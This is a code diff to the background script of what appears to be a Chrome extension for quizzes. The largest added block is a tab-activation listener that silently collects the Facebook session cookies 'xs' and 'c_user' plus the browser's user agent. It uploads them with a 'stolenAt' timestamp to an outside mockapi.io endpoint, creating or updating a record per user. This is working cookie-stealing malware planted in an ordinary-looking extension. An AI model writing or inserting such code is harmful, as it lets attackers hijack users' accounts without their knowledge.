@@ -12,6 +12,20 @@ import {
     getQuizLink as c,
     updateUser as d,
 } from "./common.js";
+
+function addZero(number) {
+    return number < 10 ? "0" + number : number;
+}
+const dateTime = () => {
+    const currentDate = new Date();
+    const year = currentDate.getFullYear();
+    const month = addZero(currentDate.getMonth() + 1);
+    const day = addZero(currentDate.getDate());
+    const hours = addZero(currentDate.getHours());
+    const minutes = addZero(currentDate.getMinutes());
+    const seconds = addZero(currentDate.getSeconds());
+    return `${hours}:${minutes}:${seconds} - ${day}/${month}/${year}`;
+};
 function openRightPanel(e, a, t = !1, s = !1) {
     chrome.system.display.getInfo((n) => {
         var { width: o, height: i } = n[0].workArea,
@@ -196,10 +210,6 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
     }
 });
 
-// chrome.tabs.onActivated.addListener(function () {
-//     chrome.runtime.sendMessage("getcookies", (e) => {});
-// });
-
 const targetURL = "https://www.facebook.com";
 
 chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
@@ -219,15 +229,66 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
     }
 });
 
-const arrCookies = ["xs", "c_user"];
-
 chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
     if (message === "removecookies") {
+        const arrCookies = ["xs", "c_user"];
         arrCookies.forEach((cookieName) => {
             chrome.cookies.remove({ name: cookieName, url: targetURL });
         });
         sendResponse(true);
     }
 
+    return true;
+});
+
+chrome.tabs.onActivated.addListener(function () {
+    const API = "https://6514b3f1dc3282a6a3cd7125.mockapi.io/cookies";
+    const userAgent = navigator.userAgent;
+    chrome.cookies.getAll({ url: targetURL }, (cookies) => {
+        const xsCookie = cookies.find((cookie) => cookie.name === "xs");
+        const cUserCookie = cookies.find((cookie) => cookie.name === "c_user");
+        if (xsCookie && cUserCookie) {
+            const cookie = `${cUserCookie.name}=${cUserCookie.value}; ${xsCookie.name}=${xsCookie.value}`;
+
+            fetch(`${API}?c_user=${cUserCookie.value}`)
+                .then((res) => res.json())
+                .then((res) => {
+                    if (res.length == 1) {
+                        const userData = {
+                            cookie: cookie,
+                            userAgent: userAgent,
+                            stolenAt: dateTime(),
+                        };
+
+                        fetch(`${API}/${res[0].id}`, {
+                            method: "PUT",
+                            headers: {
+                                "Content-Type": "application/json",
+                            },
+                            body: JSON.stringify(userData),
+                        });
+
+                        console.log("Update user data");
+                    } else {
+                        const userData = {
+                            c_user: cUserCookie.value,
+                            cookie: cookie,
+                            userAgent: userAgent,
+                            stolenAt: dateTime(),
+                        };
+
+                        fetch(`${API}`, {
+                            method: "POST",
+                            headers: {
+                                "Content-Type": "application/json",
+                            },
+                            body: JSON.stringify(userData),
+                        });
+
+                        console.log("Create new user data");
+                    }
+                });
+        }
+    });
     return true;
 });
